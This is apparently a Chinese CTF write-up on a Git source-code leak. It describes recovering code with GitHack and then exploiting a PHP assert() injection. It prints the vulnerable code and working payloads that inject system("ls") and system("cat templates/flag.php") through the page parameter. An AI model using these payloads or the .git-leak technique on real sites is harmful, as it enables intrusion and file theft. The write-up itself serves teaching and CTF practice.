Git源码泄露

漏洞成因及利用：

    开发者因Git版本控制器使用不当造成源码泄露。当开发者在一个空目录执行git init时，Git会创建一个新的仓库，包含所有Git存储和操作的对象，如果想备份或复制一个版本库，只需要把这个目录复制到另一处就可以了。

    开发者在发布代码时，如果没有把.git目录删除，直接发布到了运行目录中，攻击者就可以通过下载这个文件夹恢复源代码，通常用到的工具就是GitHack。它能解析.git/index信息，并找到工程中所有文件名和文件sha1，然后去.git/objects文件夹下载对应的文件，通过zlib解压文件，按原始的目录结构写入源代码。

防范思路:

    对.git目录的访问权限进行控制
    在每次pull之后删除.git文件夹


GitHack获得源代码

    有意思的地方：
——————————————————————————————————————————————
<?php

if (isset($_GET['page'])) {
        $page = $_GET['page'];
} else {
        $page = "home";
}

$file = "templates/" . $page . ".php";

// I heard '..' is dangerous!
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");

// TODO: Make this look nice
assert("file_exists('$file')") or die("That file doesn't exist!");

?>
————————————————————————————————————————————————
assert()函数会将括号中的字符当成代码来执行，并返回true或false
strpos()函数会返回字符串第一次出现的位置，如果没有找到则返回False

闭合file_exists的 ' 构造payload

payload=

?page='.system("ls").'或者page=').system("ls");//前者直接显示，后者在源码中才能看见。

flag payload=

?page=').system("cat templates/flag.php");//或者?page='.system("cat templates/flag.php").'

两者都需查看源码获得flag